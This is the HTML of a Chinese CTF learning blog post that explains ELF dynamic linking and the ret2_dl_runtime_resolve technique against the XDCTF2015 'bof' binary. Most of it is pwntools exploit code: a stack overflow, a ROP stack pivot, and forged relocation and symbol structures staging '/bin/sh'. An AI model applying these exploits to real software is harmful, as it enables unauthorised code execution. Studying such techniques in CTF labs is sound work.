<!DOCTYPE html>
<!--[if lte IE 8 ]>
<html class="ie" xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-US" lang="en-US">
<![endif]-->
<!--[if (gte IE 9)|!(IE)]><!-->
<!--
***************  *      *     *
      8          *    *       *
      8          *  *         *
      8          **           *
      8          *  *         *
      8          *    *       *
      8          *      *     *
      8          *        *   ***********    -----Theme By Kieran(http://go.kieran.top)
-->
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="zh-CN" lang="zh-CN">
<!--<![endif]-->

<head>
  <title>高级ret2_dl_runtime_resolve | Hexo</title>
  <!-- Meta data -->
    <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="generator" content="Hexo">
    <meta name="author" content="John Doe">
    <meta name="description" content="" />
    <meta name="keywords" content="" />

    <!-- Favicon, (keep icon in root folder) -->
    <link rel="Shortcut Icon" href="/img/favicon.ico" type="image/ico">

    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
    <link rel="stylesheet" href="/css/all.css" media="screen" type="text/css">
    
    <link rel="stylesheet" href="/highlightjs/vs.css" type="text/css">
    

    <!--[if IE 8]>
    <link rel="stylesheet" type="text/css" href="/css/ie8.css" />
    <![endif]-->

    <!-- jQuery | Load our jQuery, with an alternative source fallback to a local version if request is unavailable -->
    <script src="/js/jquery-1.11.1.min.js"></script>
    <script>window.jQuery || document.write('<script src="js/jquery-1.11.1.min.js"><\/script>')</script>

    <!-- Load these in the <head> for quicker IE8+ load times -->
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
    <script src="/js/html5shiv.min.js"></script>
    <script src="/js/respond.min.js"></script>
    <![endif]-->

  
  
  

  <style>.col-md-8.col-md-offset-2.opening-statement img{display:none;}</style>
</head>

<!--
<body class="post-template">
-->
<body id="index" class="lightnav animsition">

      <!-- ============================ Off-canvas navigation =========================== -->

    <div class="sb-slidebar sb-right sb-style-overlay sb-momentum-scrolling">
        <div class="sb-close" aria-label="Close Menu" aria-hidden="true">
            <img src="/img/close.png" alt="Close"/>
        </div>
        <!-- Lists in Slidebars -->
        <ul class="sb-menu">
            <li><a href="/" class="animsition-link" title="Home">Home</a></li>
            <li><a href="/archives" class="animsition-link" title="archive">archive</a></li>
            <!-- Dropdown Menu -->
			 
            <li>
                <a class="sb-toggle-submenu">Dare to point?<span class="sb-caret"></span></a>
                <ul class="sb-submenu">
                    
                        <li><a href="https://pwnable.kr" target="_BLANK" class="animsition-link">pwnable.kr</a></li>
                    
                        <li><a href="https://pwnable.tw" target="_BLANK" class="animsition-link">pwnable.tw</a></li>
                    
                </ul>
            </li>
            
            
            
            <li>
                <a class="sb-toggle-submenu">Links<span class="sb-caret"></span></a>
                <ul class="sb-submenu">
                    
                    <li><a href="https://www.jianshu.com/" class="animsition-link">简书</a></li>
                    
                    <li><a href="https://www.zybuluo.com/mdeditor#1507451" class="animsition-link">作业部落</a></li>
                    
                </ul>
            </li>
            <li><a href="https://www.zybuluo.com/mdeditor#1507451" class="animsition-link" title="Home">write</a></li>
            
        </ul>
        <!-- Lists in Slidebars -->
        <ul class="sb-menu secondary">
            
            <li><a href="https://www.baidu.com/?tn=99140155_hao_pg" class="animsition-link" title="about">百度</a></li>
            <li><a href="https://www.google.com/" class="animsition-link" title="rss">谷歌</a></li>
        </ul>
    </div>
    
    <!-- ============================ END Off-canvas navigation =========================== -->

    <!-- ============================ #sb-site Main Page Wrapper =========================== -->

    <div id="sb-site">
        <!-- #sb-site - All page content should be contained within this id, except the off-canvas navigation itself -->

        <!-- ============================ Header & Logo bar =========================== -->

        <div id="navigation" class="navbar navbar-fixed-top">
            <div class="navbar-inner">
                <div class="container">
                    <!-- Nav logo -->
                    <div class="logo">
                        <a href="/" title="Logo" class="animsition-link">
                         <img src="/img/logo.png" alt="Logo" width="35px;"/> 
                        </a>
                    </div>
                    <!-- // Nav logo -->
                    <!-- Info-bar -->
                    <nav>
                        <ul class="nav">
                            <li><a href="/" class="animsition-link">Hexo</a></li>
                            <li class="nolink"><span>Always </span>Creative.</li>
                            
                            <li><a href="https://www.baidu.com/" title="Github" target="_blank"><i class="icon-github"></i></a></li>
                            
                            
                            <li><a href="https://twitter.com/" title="Twitter" target="_blank"><i class="icon-twitter"></i></a></li>
                            
                            
                            <li><a href="https://www.facebook.com/" title="Facebook" target="_blank"><i class="icon-facebook"></i></a></li>
                            
                            
                            <li><a href="https://google.com/" title="Google-Plus" target="_blank"><i class="icon-google-plus"></i></a></li>
                            
                            
                            <li><a href="http://weibo.com/" title="Sina-Weibo" target="_blank"><i class="icon-sina-weibo"></i></a></li>
                            
                            <li class="nolink"><span>Welcome!</span></li>
                        </ul>
                    </nav>
                    <!--// Info-bar -->
                </div>
                <!-- // .container -->
                <div class="learnmore sb-toggle-right">More</div>
                <button type="button" class="navbar-toggle menu-icon sb-toggle-right" title="More">
                <span class="sr-only">Toggle navigation</span>
                <span class="icon-bar before"></span>
                <span class="icon-bar main"></span>
                <span class="icon-bar after"></span>
                </button>
            </div>
            <!-- // .navbar-inner -->
        </div>

        <!-- ============================ Header & Logo bar =========================== -->


      
<section id="intro">
    <div class="container">
        <div class="row col-md-offset-2">
            <div class="col-md-8">
    			<span class="post-meta">
      <time datetime="2019-07-04T05:19:56.499Z" itemprop="datePublished">
          2019-07-04
      </time>
    
</span>
                <h1>高级ret2_dl_runtime_resolve</h1>
            </div>
        </div>
        <div class="col-md-8 col-md-offset-2">
      		<p>Ret2dl<br>准备：</p>
<ul>
<li><p>readelf工具的使用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-h 显示文件的头部信息</span><br><span class="line">-l(program headers),segments 显示程序头（段头）信息(如果有数据的话)。</span><br><span class="line">-S(section headers),sections 显示节头信息(如果有数据的话)(区分大小写)</span><br><span class="line">-g(section groups),显示节组信息(如果有数据的话)</span><br><span class="line">-t,section-details 显示节的详细信息(-S的)</span><br><span class="line">-r,relocs 显示可重定位段的信息</span><br><span class="line">-d,dynamic 显示动态段的信息。</span><br></pre></td></tr></table></figure>
</li>
<li><p>1.首先了解<code>ELF</code>关于动态链接的一些关键<code>section</code><br><img src="https://img-blog.csdnimg.cn/20190514123657606.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMDM3Mzc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</li>
</ul>
<p><code>DT_STRTAB, DT_SYMTAB, DT_JMPREL</code>这三项，这三个东西分别包含了指向<code>.dynstr, .dynsym, .rel.plt</code>这3个<code>section</code>的指针，可以<code>readelf -S 可执行文件</code>看一下<br><img src="https://img-blog.csdnimg.cn/20190514123715440.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMDM3Mzc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><code>.dynamic：</code>包含了一些关于动态链接的关键信息，事实上这个section所有程序都差不多<br><img src="https://img-blog.csdnimg.cn/20190514124211201.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMDM3Mzc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><code>.dynstr：</code>一个字符串表，index为0的地方永远是0，然后后面是动态链接所需的字符串，0结尾，包括导入函数名，比方说这里很明显有个read。到时候，相关数据结构引用一个字符串时，用的是相对这个section头的偏移</p>
<p><code>.dynsym</code>这个东西，是一个符号表（结构体数组），里面记录了各种符号的信息，每个结构体对应一个符号。我们这里只关心函数符号，比方说上面的puts。<br><code>.rel.plt</code>：这里是重定位表（不过跟windows那个重定位表概念不同），也是一个结构体数组，每个项对应一个导入函数。结构体定义如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">typedef struct&#123;</span><br><span class="line">  Elf32_Addr    r_offset; //指向GOT表的指针</span><br><span class="line">  Elf32_Word    r_info; </span><br><span class="line">  //一些关于导入符号的信息，我们只关心从第二个字节开始的值((val)&gt;&gt;8)，忽略那个07</span><br><span class="line">  //1和3是这个导入函数的符号在.dynsym中的下标，</span><br><span class="line">  //如果往回看的话你会发现1和3刚好和.dynsym的puts和__libc_start_main对应</span><br><span class="line">&#125; Elf32_Rel;</span><br></pre></td></tr></table></figure>

<ul>
<li>_dl_runtime_resolve做了什么</li>
</ul>
<p>利用自己写的<code>hello</code>来测试一下<code>put@plt</code>在程序里面干了什么（将断点下在程序的<code>main</code>出，随便下）<br> <img src="https://img-blog.csdnimg.cn/20190514124323102.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMDM3Mzc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>注：<code>puts@plt</code> 第一条指令是跳转，这里存放是<code>push</code>的地址（在我们看来这里应该直接跳转到<code>got</code>表里面去）<br><img src="https://img-blog.csdnimg.cn/20190514124332976.png" alt="在这里插入图片描述"></p>
<p>继续往下走 回发现一个<code>jmp</code> 跳转到红色的地方，<code>0x804a004</code>（是一个<code>link_map</code>的指针）<br><img src="https://img-blog.csdnimg.cn/2019051412435713.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMDM3Mzc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>它包含了<code>.dynamic</code>的指针，通过这个<code>link_map</code>，<code>_dl_runtime_resolve</code>函数可以访问到<code>.dynamic</code>这个<code>section</code><br><img src="https://img-blog.csdnimg.cn/20190514124410912.png" alt="在这里插入图片描述"><br><code>0x08049f14</code>是<code>.dynamic</code>的指针  这个可以和前面 <code>.dynamuic</code>的值是一样的<br>一般函数<code>plt</code>调用如下<br><code>read@plt:</code></p>
<p>注，其实在这里我们应该存放的是我们调用函数的地址，因为延迟捆绑技术，需要利用plt返回重定位<br><code>jmp *(read@GOT)</code>  #跳转到<code>got</code>表中  其实这地方保存的地址是<code>push</code>的地址（第一次调用）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">push n</span><br><span class="line"></span><br><span class="line">push 保存当前程序的.dynamic的link_map指针</span><br><span class="line"></span><br><span class="line">jump _dl_runtime_resolve()   #跳转到ret dl处执行我们的代码</span><br></pre></td></tr></table></figure>

<ul>
<li>_dl_runtime_resolve会</li>
</ul>
<ol>
<li>用<code>link_map</code>访问<code>.dynamic</code>，取出<code>.dynstr, .dynsym, .rel.plt</code>的指针</li>
<li>.<code>rel.plt + 第二个参数</code>求出当前函数的重定位表项<code>Elf32_Rel</code>的指针，记作<code>rel</code></li>
<li><code>rel-&gt;r_info &gt;&gt; 8</code>作为<code>.dynsym</code>的下标，求出当前函数的符号表项<code>Elf32_Sym</code>的指针，记作<code>sym</code></li>
<li><code>.dynstr + sym-&gt;st_name</code>得出符号名字符串指针</li>
<li>在动态链接库查找这个函数的地址，并且把地址赋值给<code>*rel-&gt;r_offset</code>，即<code>GOT</code>表</li>
<li>调用这个函数<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"></span><br><span class="line">from pwn import *    </span><br><span class="line">elf = ELF(&apos;bof&apos;)</span><br><span class="line">offset = 112</span><br><span class="line">read_plt = elf.plt[&apos;read&apos;]</span><br><span class="line">write_plt = elf.plt[&apos;write&apos;]</span><br><span class="line"></span><br><span class="line"># 0x08048618 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">ppp_ret = 0x08048619      # ROPgadget --binary bof --only &quot;pop|ret&quot;</span><br><span class="line">pop_ebp_ret = 0x0804861b</span><br><span class="line">leave_ret = 0x08048458     # ROPgadget --binary bof --only &quot;leave|ret&quot;</span><br><span class="line"></span><br><span class="line">stack_size = 0x800</span><br><span class="line">bss_addr = 0x0804a040	 # readelf -S bof | grep &quot;.bss&quot;</span><br><span class="line">base_stage = bss_addr + stack_size       #  我们可以任意我们伪造栈的大小</span><br><span class="line"></span><br><span class="line">r = process(&apos;./bof&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.recvuntil(&apos;Welcome to XDCTF2015~!\ n&apos;)   #先接受一下数据 在其他的程序里面，不接受数据会打乱我内部数据</span><br><span class="line">payload = &apos;A&apos; * offset    #制造溢出</span><br><span class="line">payload += p32(read_plt)   #利用返回地址 写入我们的payload ，后面的payload 都是由read读取</span><br><span class="line">payload += p32(ppp_ret)   #填充read的参数，先pop出栈内的数据，（自己理解为清栈操作）</span><br><span class="line">payload += p32(0)   #文件标识符  0 标准读入</span><br><span class="line">payload += p32(base_stage)   #伪造栈一个足够大的栈，够我们写入</span><br><span class="line">payload += p32(100)   #read可以读取的最大字符串数</span><br><span class="line">payload += p32(pop_ebp_ret)   #这里将pppret的返回地址覆盖为 当下地址，将base_stage 的地址设置为ebp 我们的栈基址</span><br><span class="line">payload += p32(base_stage) #改写ebp   </span><br><span class="line">payload += p32(leave_ret)  ##将ebp指向esp   #了解leace里面的汇编代码</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">cmd = &quot;/bin/sh&quot;</span><br><span class="line"></span><br><span class="line">payload2 = &apos;AAAA&apos;    #这里需要覆盖 应该是leave_ret的影响，新的ebp  （自己这里也有点迷惑</span><br><span class="line">payload2 += p32(write_plt)  #自己不太肯定 ，因该p32(leave_ret)的返回地址 覆盖为write的地址，这里是为了验证我们可以泄露我们栈内的数据</span><br><span class="line">payload2 += &apos;AAAA&apos;   # 覆盖返回地址</span><br><span class="line">payload2 += p32(1) #标准</span><br><span class="line">payload2 += p32(base_stage + 80)  #用write泄露地址的位置  （这里可以改为，我们想要泄露的地方</span><br><span class="line">payload2 += p32(len(cmd))  #这里是泄露地址的大小  没把握就用函数自己计算长度</span><br><span class="line">payload2 += &apos;A&apos; * (80 - len(payload2))   #这里payload2  是在这个paylod以前的payload2的长度  （换句话说就是为了构造80个A  ，第81 就是我们泄露的地址内容 （用write函数就是为了验证，我们泄露栈内的地址是否成功）</span><br><span class="line">payload2 += cmd + &apos;\x00&apos;   #‘bin/sh\x00  是我们需要4自己对其的模式</span><br><span class="line">payload2 += &apos;A&apos; * (100 - len(payload2))  #我们是read最多可以读取100  我们没事干也可以将没用的填充，这里不影响我我们泄露/bin/sh，是都可以被我我们读取出来</span><br><span class="line">r.sendline(payload2)   #write相当一个输出函数，我们不需要用recv来接收和打印出来</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

</li>
</ol>
<p>注：上面的代码只是为了测试我们可以用<code>write</code>函数可以泄露出我们想要的栈里面的内容</p>
<p><code>Got</code> 找到相应的内容自己理解一下<br><code>GOT[1]</code>：一个指向内部数据结构的指针，类型是 <code>link_map</code>，在动态装载器内部使用，包含了进行符号解析需要的当前 <code>ELF</code> 对象的信息。在它的<code>l_info</code>域中保存了<code>.dynamic</code> 段中大多数条目的指针构成的一个数组，我们后面会利用它。<br><code>GOT[2]</code>：一个指向动态装载器中 <code>_dl_runtime_resolve</code> 函数的指针。<br>函数使用参数<code>link_map_obj</code>来获取解析导入函数（使用<code>reloc_index</code>参数标识）需要的信息，并将结果写到正确的 <code>GOT</code>条目中。在 <code>_dl_runtime_resolve</code> 解析完成后，控制流就交到了那个函数手里，而下次再调用函数的<code>plt</code>时，就会直接进入目标函数中执行。</p>
<p>注：在进行到现在，我想的是，作者是为了给我们验证，我们可以改程序里面的铭感的参数，来实现我们的函数的调用（应为我们的题，里面没有<code>sysytem</code>这个函数  但是我们可以伪造<code>system</code>函数里面的，标志参数</p>
<ul>
<li>二</li>
</ul>
<p>我这将他简化一下<br>在前面这个脚本里  我们验证了，可以利用<code>write@plt</code>去泄露地址，我们这此测试，我们是否可以伪造<code>write@plt</code>里面的参数来实现我们地址的泄露</p>
<p>我们知道在<code>@plt</code>里面 我们是通过<code>plt</code>跳转到我们<code>got</code>表中记录函数的位置，在第一次调用（使用延迟捆绑技术）所以没有我们<code>write</code>的地址，现在我们能否控制<code>eip</code>到<code>got0</code>跳转到我们的<code>write</code>函数处<br><code>Write</code>函数调用</p>
<p><code>write@plt</code>时其实是先将 <code>reloc_index</code>压入栈，然后跳转到 <code>PLT[0]</code>：  （需要自己<code>gdb</code>调试进入<code>plt</code>表进行查看，我每一个函数的@plt的调用都是这样</p>
<p>#这个代码是为了验证，我们将<code>write@plt</code>函数去掉，改为内部的参数是否可以，继续我们泄露<code>/bin/sh</code>的内容</p>
<p><code>plt_0    = elf.get_section_by_name(&#39;.plt&#39;).header.sh_addr</code>#这里需要增加地址  <code>plt</code>对应的是<code>plt</code>跳转到<code>got</code>表的地址，我们这里可以用现成的函数找到地址   （后期我会自己将地址找出来，便于理解，现成的函数虽然好用，但是知道多一种方法，多一种解题的思路<br><code>reloc_index = 0x20</code></p>
<p>#注：参考的脚本里面会出现，更改名称，自己在测试的时候吃了亏  多留心一下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">payload_3  = &quot;AAAA&quot;</span><br><span class="line">payload_3 += p32(plt_0) #跳转到got表的地方  #如果我们第一次调用，会直接跳撞到  下面一条指令 因为当时存储的是，put @6的地址  </span><br><span class="line">payload_3 += p32(reloc_index)  #这里将 write的调试标识符号填写进去  伪造调用了write函数</span><br><span class="line">payload_3 += &quot;AAAA&quot;</span><br><span class="line">payload_3 += p32(1)</span><br><span class="line">payload_3 += p32(base_stage + 80)</span><br><span class="line">payload_3 += p32(len(&quot;/bin/sh&quot;))</span><br><span class="line">payload_3 += &quot;A&quot; * (80 - len(payload_3))</span><br><span class="line">payload_3 += &quot;/bin/sh\x00&quot;</span><br><span class="line">payload_3 += &quot;A&quot; * (100 - len(payload_3))</span><br><span class="line"></span><br><span class="line">r.sendline(payload_3)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>该结构体的 r_offset 是 write@got 地址，即 0x0804a01c，r_info 是 0x707。动态装载器通过 reloc_index 找到它，而 reloc_index 是相对于 .rel.plt 的偏移，所以我们如果控制了这个偏移，就可以跳转到伪造的 write 上</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">reloc_index = base_stage + 28 - rel_plt  # fake_reloc = base_addr + 28</span><br><span class="line"></span><br><span class="line">r_info = 0x607   #readelf -r a.out | grep write</span><br><span class="line"></span><br><span class="line">fake_reloc = p32(write_got) + p32(r_info)</span><br><span class="line"></span><br><span class="line">payload_4  = &quot;AAAA&quot;</span><br><span class="line">payload_4 += p32(plt_0)</span><br><span class="line">payload_4 += p32(reloc_index)</span><br><span class="line">payload_4 += &quot;AAAA&quot;</span><br><span class="line">payload_4 += p32(1)</span><br><span class="line">payload_4 += p32(base_stage + 80)</span><br><span class="line">payload_4 += p32(len(&quot;/bin/sh&quot;))</span><br><span class="line">payload_4 += fake_reloc    # base_addr + 28   通过reloc_index来找到我们伪造的write</span><br><span class="line">payload_4 += &quot;A&quot; * (80 - len(payload_4))</span><br><span class="line">payload_4 += &quot;/bin/sh\x00&quot;</span><br><span class="line">payload_4 += &quot;A&quot; * (100 - len(payload_4))</span><br></pre></td></tr></table></figure>

<p>下面要用到计算Elf32_Rel</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ELF32_R_SYM(0x707) = (0x707 &gt;&gt; 8) = 0x7，即 .dynsym 的第 7 行</span><br><span class="line">ELF32_R_TYPE(0x707) = (0x707 &amp; 0xff) = 0x7，即 #define R_386_JMP_SLOT 7 /* Create PLT entry </span><br><span class="line">ELF32_R_INFO(0x7, 0x7) = (((0x7 &lt;&lt; 8) + ((0x7) &amp; 0xff)) = 0x707，即 r_info</span><br></pre></td></tr></table></figure>

<p>这一次，伪造位于 .dynsym 段的结构体 Elf32_Sym，原结构体如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  Elf32_Word    st_name;        /* Symbol name (string tbl index) */</span><br><span class="line">  Elf32_Addr    st_value;       /* Symbol value */</span><br><span class="line">  Elf32_Word    st_size;        /* Symbol size */</span><br><span class="line">  unsigned char st_info;        /* Symbol type and binding */</span><br><span class="line">  unsigned char st_other;       /* Symbol visibility */</span><br><span class="line">  Elf32_Section st_shndx;       /* Section index */</span><br><span class="line">&#125; Elf32_Sym;</span><br></pre></td></tr></table></figure>


<p>注：st_name 和 st_info，  3a 和12  （这里显示错误  应该是第7行的值）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">fake_sym_addr = base_stage + 36</span><br><span class="line">align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf) # since the size of Elf32_Sym is 0x10</span><br><span class="line">fake_sym_addr = fake_sym_addr + align</span><br><span class="line"></span><br><span class="line">r_sym = (fake_sym_addr - dynsym) / 0x10</span><br><span class="line">r_type = 0x7</span><br><span class="line">r_info = (r_sym &lt;&lt; 8) + (r_type &amp; 0xff)</span><br><span class="line"></span><br><span class="line">fake_reloc = p32(write_got) + p32(r_info)   #下面一部分 我们可以知道</span><br><span class="line">reloc_index = base_stage + 28 - rel_plt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">st_name = 0x4c   </span><br><span class="line">st_info = 0x12</span><br><span class="line">fake_sym = p32(st_name) + p32(0) + p32(0) + p32(st_info)</span><br><span class="line"></span><br><span class="line">payload_5  = &quot;AAAA&quot;</span><br><span class="line">payload_5 += p32(plt_0)</span><br><span class="line">payload_5 += p32(reloc_index)  #找到我们伪造的write函数</span><br><span class="line">payload_5 += &quot;AAAA&quot;</span><br><span class="line">payload_5 += p32(1)</span><br><span class="line">payload_5 += p32(base_stage + 80)</span><br><span class="line">payload_5 += p32(len(&quot;/bin/sh&quot;))</span><br><span class="line">payload_5 += fake_reloc   #伪造write的内部结构</span><br><span class="line">payload_5 += &quot;A&quot; * align</span><br><span class="line">payload_5 += fake_sym</span><br><span class="line">payload_5 += &quot;A&quot; * (80 - len(payload_5))</span><br><span class="line">payload_5 += &quot;/bin/sh\x00&quot;</span><br><span class="line">payload_5 += &quot;A&quot; * (100 - len(payload_5))</span><br></pre></td></tr></table></figure>

<ul>
<li>参考文献：<br>脚本参考：<a href="http://pwn4.fun/2016/11/09/Return-to-dl-resolve/" target="_blank" rel="noopener">http://pwn4.fun/2016/11/09/Return-to-dl-resolve/</a><br>最好多读几遍：<a href="https://github.com/firmianay/CTF-All-In-One/blob/master/doc/6.1.3_pwn_xdctf2015_pwn200.md" target="_blank" rel="noopener">https://github.com/firmianay/CTF-All-In-One/blob/master/doc/6.1.3_pwn_xdctf2015_pwn200.md</a><br>重定位表：<a href="http://bdxnote.blog.163.com/blog/static/8444235201542614525660/" target="_blank" rel="noopener">http://bdxnote.blog.163.com/blog/static/8444235201542614525660/</a><br>重点文章：<a href="https://xz.aliyun.com/t/5122#toc-17" target="_blank" rel="noopener">https://xz.aliyun.com/t/5122#toc-17</a></li>
</ul>

            <div class="clearfix"></div>
            <hr class="nogutter">
        </div>
        <nav class="m-pagination col-md-8 col-md-offset-2 col-sm-24" role="pagination">
    
    
    <a class="pull-right" href="/2019/07/04/hello-world/">
        Hello World →
    </a>
    
</nav>

        <div class="col-md-8 col-md-offset-2 col-sm-24"><script type="text/javascript">
  /**
   * 搜狐畅言
   */

  /*
  document.write('<div id="SOHUCS" sid="' + window.location.pathname.slice(1) + '" ></div>');

  window.onload = function () {
    (function () {
      var appid = 'cytXXXX';
      var conf = 'prod_xxxxxxxxxxxxxxxxx';
      var width = window.innerWidth || document.documentElement.clientWidth;
      var loadJs = function (d, a, id) {
        var c = document.getElementsByTagName("head")[0] || document.head || document.documentElement;
        var b = document.createElement("script");
        b.setAttribute("type", "text/javascript");
        b.setAttribute("charset", "UTF-8");
        b.setAttribute("src", d);
        if (id) {
          b.setAttribute("id", id);
        }
        if (typeof a === "function") {
          if (window.attachEvent) {
            b.onreadystatechange = function () {
              var e = b.readyState;
              if (e === "loaded" || e === "complete") {
                b.onreadystatechange = null;
                a()
              }
            }
          } else {
            b.onload = a
          }
        }
        c.appendChild(b)
      };

      loadJs("https://changyan.sohu.com/upload/changyan.js", function () {
        window.changyan.api.config({
          appid: appid,
          conf: conf
        })
      });
    })();
  }
  */

</script>
</div>
    </div>
</section>


      
<!-- ============================ Footer =========================== -->

<footer>
    <div class="container">
            <div class="copy">
                <p>
                    &copy; 2014<script>new Date().getFullYear()>2010&&document.write("-"+new Date().getFullYear());</script>, Content By John Doe. All Rights Reserved.
                </p>
                <p>Theme By <a href="https://www.jianshu.com/" style="color: #767D84">简书</a></p>
            </div>
            <div class="social">
                <ul>
                    
                    <li><a href="https://www.baidu.com/" title="Github" target="_blank"><i class="icon-github"></i></a>&nbsp;</li>
                    
                    
                    <li><a href="https://twitter.com/" title="Twitter" target="_blank"><i class="icon-twitter"></i></a>&nbsp;</li>
                    
                    
                    <li><a href="https://www.facebook.com/" title="Facebook" target="_blank"><i class="icon-facebook"></i></a>&nbsp;</li>
                    
                    
                    <li><a href="https://google.com/" title="Google-Plus" target="_blank"><i class="icon-google-plus"></i></a>&nbsp;</li>
                    
                    
                    <li><a href="http://weibo.com/" title="Sina-Weibo" target="_blank"><i class="icon-sina-weibo"></i></a>&nbsp;</li>
                    
                </ul>
            </div>
            <div class="clearfix"> </div>
        </div>
</footer>

<!-- ============================ END Footer =========================== -->
      <!-- Load our scripts -->
<!-- Resizable 'on-demand' full-height hero -->
<script type="text/javascript">
    var resizeHero = function () {
        var hero = $(".cover,.heightblock"),
            window1 = $(window);
        hero.css({
            "height": window1.height()
        });
    };

    resizeHero();

    $(window).resize(function () {
        resizeHero();
    });
</script>
<script src="/js/plugins.min.js"></script><!-- Bootstrap core and concatenated plugins always load here -->
<script src="/js/scripts.js"></script><!-- Theme scripts -->


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
$('#intro').find('img').each(function(){
  var alt = this.alt;

  if (alt){
